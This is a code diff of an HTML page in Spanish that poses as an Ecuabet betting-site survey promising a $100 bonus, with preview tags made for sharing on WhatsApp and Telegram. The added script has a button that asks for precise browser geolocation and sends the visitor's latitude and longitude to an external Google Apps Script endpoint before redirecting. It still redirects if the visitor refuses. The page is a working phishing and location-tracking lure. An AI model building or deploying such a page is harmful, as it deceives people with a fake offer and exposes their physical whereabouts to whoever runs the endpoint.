@@ -3,108 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <!-- Título y Descripción que aparecerán en la vista previa de WhatsApp -->
     <title>Gana un Bono de $100 - Ecuabet</title>
     <meta name="description" content="Si ya eres parte de ECUABET, solo llena la siguiente encuesta.">
 
-    <!-- META TAGS OPEN GRAPH (Para WhatsApp, Facebook, Telegram, etc.) -->
     <meta property="og:type" content="website">
     <meta property="og:title" content="¿TE GUSTARÍA PARTICIPAR POR UN BONO DE $100?">
     <meta property="og:description" content="Si ya eres parte de ECUABET, solo llena la siguiente encuesta.">
-    
-    <!-- Enlace directo a la imagen ecuabet.png en tu repositorio de GitHub -->
     <meta property="og:image" content="https://raw.githubusercontent.com/iliali/ecuabet/main/ecuabet.png">
     <meta property="og:image:secure_url" content="https://raw.githubusercontent.com/iliali/ecuabet/main/ecuabet.png">
-    <meta property="og:image:type" content="image/png">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
 
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            background: #1a237e;
-            color: #ffffff;
-            text-align: center;
-            padding: 20px;
-        }
-        .card {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 30px;
-            border-radius: 12px;
-            backdrop-filter: blur(10px);
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-            max-width: 420px;
-            width: 100%;
-        }
-        h2 {
-            font-size: 20px;
-            margin-bottom: 15px;
-        }
-        p {
-            font-size: 14px;
-            color: #e0e0e0;
-            margin-bottom: 20px;
-            line-height: 1.4;
-        }
-        .btn {
-            display: inline-block;
-            width: 100%;
-            padding: 12px 20px;
-            background-color: #00c853;
-            color: white;
-            text-decoration: none;
-            font-weight: bold;
-            border-radius: 6px;
-            transition: background 0.3s;
-        }
-        .btn:hover {
-            background-color: #00e676;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #1a237e; color: #fff; text-align: center; padding: 20px; }
+        .card { background: rgba(255, 255, 255, 0.1); padding: 30px; border-radius: 12px; backdrop-filter: blur(10px); box-shadow: 0 4px 15px rgba(0,0,0,0.3); max-width: 420px; width: 100%; }
+        h2 { font-size: 20px; margin-bottom: 15px; }
+        p { font-size: 14px; color: #e0e0e0; margin-bottom: 20px; }
+        .btn { width: 100%; padding: 14px; background-color: #00c853; color: white; border: none; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; }
+        #status { margin-top: 15px; font-size: 13px; color: #ffd54f; }
     </style>
 </head>
 <body>
-
     <div class="card">
-        <h2>Cargando encuesta de Ecuabet...</h2>
-        <p>Por favor, permite el acceso a tu ubicación cuando el navegador lo solicite para continuar.</p>
-        <a id="redirect-link" href="https://script.google.com/macros/s/AKfycbwd9e8X06X01Bn13evnRmV07WfOxI6pDob5gYWY0_sUzJJQ2FnaUg0WI9THY9bTDVJf/exec" class="btn">Continuar al Formulario</a>
+        <h2>Encuesta de Ecuabet</h2>
+        <p>Haz clic en el botón para activar la verificación e ir a la encuesta.</p>
+        <button id="btnAction" onclick="obtenerUbicacionYRedirigir()" class="btn">CONTINUAR</button>
+        <div id="status"></div>
     </div>
 
     <script>
         const targetUrl = "https://script.google.com/macros/s/AKfycbwd9e8X06X01Bn13evnRmV07WfOxI6pDob5gYWY0_sUzJJQ2FnaUg0WI9THY9bTDVJf/exec";
 
-        function redirigir() {
-            window.location.href = targetUrl;
-        }
+        function obtenerUbicacionYRedirigir() {
+            const btn = document.getElementById('btnAction');
+            const status = document.getElementById('status');
+            btn.disabled = true;
+            status.innerText = "Por favor, permite la ubicación en tu navegador...";
 
-        // Solicita el permiso de ubicación y luego redirige
-        if ("geolocation" in navigator) {
-            navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    redirigir();
-                },
-                function(error) {
-                    console.warn("Permiso de ubicación denegado o no disponible:", error.message);
-                    redirigir();
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 5000,
-                    maximumAge: 0
-                }
-            );
-        } else {
-            redirigir();
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        // Redirige pasando las coordenadas por URL
+                        window.location.href = targetUrl + "?lat=" + lat + "&lng=" + lng;
+                    },
+                    function(error) {
+                        // Si deniega, redirige de todas formas
+                        window.location.href = targetUrl;
+                    },
+                    { enableHighAccuracy: true, timeout: 6000 }
+                );
+            } else {
+                window.location.href = targetUrl;
+            }
         }
     </script>
 </body>
